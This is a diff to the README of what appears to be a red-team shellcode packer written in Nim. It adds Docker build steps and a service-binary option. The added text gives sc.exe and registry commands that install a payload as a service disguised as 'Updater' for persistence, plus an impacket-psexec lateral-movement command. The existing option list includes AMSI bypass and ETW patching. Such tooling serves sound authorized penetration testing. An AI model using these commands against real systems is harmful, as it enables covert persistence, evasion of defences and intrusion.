@@ -44,6 +44,17 @@ compilation terminated.
 
 ```
 
+#### Docker Setup
+
+Needs to be built once (takes some time the first time, subsequent builds will be cached).
+
+`sudo docker build . -t nimsyscallloader`
+
+Then run the packer with:
+
+`sudo docker run -v $(pwd):/shared nimsyscallloader <ARGUMENTS> --output=/shared/packed.exe`
+where `$(pwd)` is the directory on the host system that is shared with the container, i.e. the directory where the files to encrypt should be and where the output will be saved to.
+
 #### Third party deps
 
 If you want to make use of Code Signing certificates via LimeLighter you'll also need the following things installed and in your %PATH%:
@@ -102,6 +113,7 @@ Options:
   --psout    Powershell Output format, reflectively loading the packed binary
     --psobfs    Pre-obfuscated Powershell Template with Invoke-obfuscation
     --pslyrics    Add Lyrics as comments to avoid some more detections
+  --service    Create a Service binary or DLL, which can be used for Lateral Movement or Persistence
 
 [Payload retrieval options]
 
@@ -129,7 +141,7 @@ Options:
   --sgn    Encode shellcode via SGN before encrypting it´
   --replace    Replace common nim IoC's in the loader like the string 'nim'
   --AMSIProviderPatch    Patch all AMSI Providers instead of 'amsi.dll' (https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
-  --AMSINtCreateSectionHook    Hook NtCreateSection to prevent 'amsi.dll' from being loaded (https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/) -> Prevent Loading works, but C# Loading fails for some reason
+  --AMSINtCreateSectionHook    Hook NtCreateSection to prevent 'amsi.dll' from being loaded (https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/)
   --sandbox value    Include Sandbox Checks of your choice into the loader:
                      Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                      DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
@@ -293,6 +305,32 @@ amd64.windows.clang.cpp.exe = "x86_64-w64-mingw32-clang++"
 amd64.windows.clang.cpp.linkerexe = "x86_64-w64-mingw32-clang++"
 ```
 
+### Service binaries
+
+Service binaries don't run on the fly. They can just be used for Windows Services. So if you're compiling a Service binary with `--service` you will need to create a new service with that binaries location. This can be done for example like this:
+
+```batch
+sc.exe create Updater binpath="C:\windows\system32\service.exe"
+sc.exe start Updater
+```
+
+The Packer binaries can also be used for impacket-psexec Lateral Movement:
+
+```
+impacket-psexec muster.local/admin:password@IP -c service.exe -remote-binary-name service.exe -service-name lateralmovement
+```
+
+Service DLLs need additional configurations. You can read [the following blog](https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain) and need some Registry changes:
+
+```batch
+sc.exe create Updater binPath= "c:\windows\System32\svchost.exe -k DcomLaunch" type= share start= auto
+reg add HKLM\SYSTEM\CurrentControlSet\services\Updater\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\windows\system32\service.dll /f
+```
+
+In addition the `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost` - `DcomLaunch` value needs to be adjusted to also contain your Service name.
+
+If you're receiving ERROR 1053 on Service start you will most likely have forgotten the last entry.
+
 ### Handling Golang binaries with the Packer
 
 My custom `Nim-RUNPE` implementatation unfortunately cannot handle GoLang binaries at the moment. That's some strange bug within Nim, have to investigate deeper sometime. Definitely a rabbit whole, already spent a lot of time.
@@ -394,7 +432,7 @@ Read this:
 - [ ] Patchless AMSI bypass (e.g. https://gist.github.com/CCob/fe3b63d80890fafeca982f76c8a3efdf)
 - [X] AMSI bypass via NtCreateSection Hook (e.g. https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/)
 - [X] More ETW Patching for EtwNotificationRegister, EtwEventRegister, EtwEventWriteFull
-- [ ] Service binary support, like https://github.com/enthus1ast/nimWindowsService/
+- [X] Service binary support, like https://github.com/enthus1ast/nimWindowsService/
 - [X] DLL hijacking switch for DLLMain with process attach
 - [X] Fix x86 casting bugs
 - [ ] Wow64 Support
